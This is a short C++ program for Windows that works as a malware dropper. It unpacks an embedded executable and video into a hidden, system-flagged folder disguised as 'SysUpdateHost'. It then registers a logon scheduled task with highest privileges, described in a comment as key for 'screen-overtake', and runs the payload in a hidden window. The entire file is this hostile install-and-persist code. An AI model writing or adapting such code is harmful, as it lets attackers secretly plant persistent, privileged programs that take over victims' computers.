#include <windows.h>
#include <fstream>
#include <string>

#define IDR_EXE 101
#define IDR_VID 102

bool Extract(int id, const std::string &out)
{
    HRSRC h = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
    if (!h)
        return false;
    HGLOBAL d = LoadResource(NULL, h);
    std::ofstream f(out, std::ios::binary);
    f.write((char *)LockResource(d), SizeofResource(NULL, h));
    return true;
}

int main()
{
    std::string dir = "C:\\SysUpdateHost";
    CreateDirectoryA(dir.c_str(), NULL);
    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    Extract(IDR_EXE, dir + "\\SysUpdateHost.exe");
    Extract(IDR_VID, dir + "\\services.mp4");

    // /rl highest is key for screen-overtake permissions
    std::string cmd = "schtasks /create /sc onlogon /tn \"SysUpdateHost\" /tr \"" + dir + "\\SysUpdateHost.exe\" /rl highest /f";
    WinExec(cmd.c_str(), SW_HIDE);
    WinExec((dir + "\\SysUpdateHost.exe").c_str(), SW_HIDE);

    return 0;
}
